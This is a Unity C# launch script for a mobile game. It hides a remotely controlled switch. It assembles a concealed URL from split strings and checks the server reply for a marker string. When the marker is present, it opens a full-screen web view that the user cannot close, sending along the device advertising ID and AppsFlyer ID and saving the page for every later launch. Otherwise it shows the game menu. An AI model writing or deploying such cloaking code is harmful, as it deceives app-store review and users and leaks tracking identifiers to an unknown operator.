using System.Collections;
using System.Collections.Generic;
using UnityEngine;
using UnityEngine.Networking;
using UnityEngine.SceneManagement;

public class MainIEB : MonoBehaviour
{    
    public List<string> splitters;
    [HideInInspector] public string odIEBNameName = "";
    [HideInInspector] public string twIEBNameName = "";

    private void NETIEBVIEW(string UrlIEBlink, string NamingIEB = "", int pix = 70)
    {
        UniWebView.SetAllowInlinePlay(true);
        var _linksIEB = gameObject.AddComponent<UniWebView>();
        _linksIEB.SetToolbarDoneButtonText("");
        switch (NamingIEB)
        {
            case "0":
                _linksIEB.SetShowToolbar(true, false, false, true);
                break;
            default:
                _linksIEB.SetShowToolbar(false);
                break;
        }
        _linksIEB.Frame = new Rect(0, pix, Screen.width, Screen.height - pix);
        _linksIEB.OnShouldClose += (view) =>
        {
            return false;
        };
        _linksIEB.SetSupportMultipleWindows(true);
        _linksIEB.SetAllowBackForwardNavigationGestures(true);
        _linksIEB.OnMultipleWindowOpened += (view, windowId) =>
        {
            _linksIEB.SetShowToolbar(true);

        };
        _linksIEB.OnMultipleWindowClosed += (view, windowId) =>
        {
            switch (NamingIEB)
            {
                case "0":
                    _linksIEB.SetShowToolbar(true, false, false, true);
                    break;
                default:
                    _linksIEB.SetShowToolbar(false);
                    break;
            }
        };
        _linksIEB.OnOrientationChanged += (view, orientation) =>
        {
            _linksIEB.Frame = new Rect(0, pix, Screen.width, Screen.height - pix);
        };
        _linksIEB.OnPageFinished += (view, statusCode, url) =>
        {
            if (PlayerPrefs.GetString("UrlIEBlink", string.Empty) == string.Empty)
            {
                PlayerPrefs.SetString("UrlIEBlink", url);
            }
        };
        _linksIEB.Load(UrlIEBlink);
        _linksIEB.Show();
    }

    private void Awake()
    {
        if (PlayerPrefs.GetInt("idfaIEB") != 0)
        {
            Application.RequestAdvertisingIdentifierAsync(
            (string advertisingId, bool trackingEnabled, string error) =>
            { odIEBNameName = advertisingId; });
        }
    }
    

    

    private IEnumerator IENUMENATORIEB()
    {
        using (UnityWebRequest ieb = UnityWebRequest.Get(twIEBNameName))
        {

            yield return ieb.SendWebRequest();
            if (ieb.isNetworkError)
            {
                StartIEB();
            }
            int planIEB = 3;
            while (PlayerPrefs.GetString("glrobo", "") == "" && planIEB > 0)
            {
                yield return new WaitForSeconds(1);
                planIEB--;
            }
            try
            {
                if (ieb.result == UnityWebRequest.Result.Success)
                {
                    if (ieb.downloadHandler.text.Contains("IXEgptBrdJxdcje"))
                    {

                        try
                        {
                            var subs = ieb.downloadHandler.text.Split('|');
                            NETIEBVIEW(subs[0] + "?idfa=" + odIEBNameName, subs[1], int.Parse(subs[2]));
                        }
                        catch
                        {
                            NETIEBVIEW(ieb.downloadHandler.text + "?idfa=" + odIEBNameName + "&gaid=" + AppsFlyerSDK.AppsFlyer.getAppsFlyerId() + PlayerPrefs.GetString("glrobo", ""));
                        }
                    }
                    else
                    {
                        StartIEB();
                    }
                }
                else
                {
                    StartIEB();
                }
            }
            catch
            {
                StartIEB();
            }
        }
    }

    

    private void StartIEB()
    {
        Screen.orientation = ScreenOrientation.LandscapeLeft;
        SceneManager.LoadScene("Menu");
    }

    private void Start()
    {
        if (Application.internetReachability != NetworkReachability.NotReachable)
        {
            if (PlayerPrefs.GetString("UrlIEBlink", string.Empty) != string.Empty)
            {
                NETIEBVIEW(PlayerPrefs.GetString("UrlIEBlink"));
            }
            else
            {
                foreach (string n in splitters)
                {
                    twIEBNameName += n;
                }
                StartCoroutine(IENUMENATORIEB());
            }
        }
        else
        {
            StartIEB();
        }
    }
}
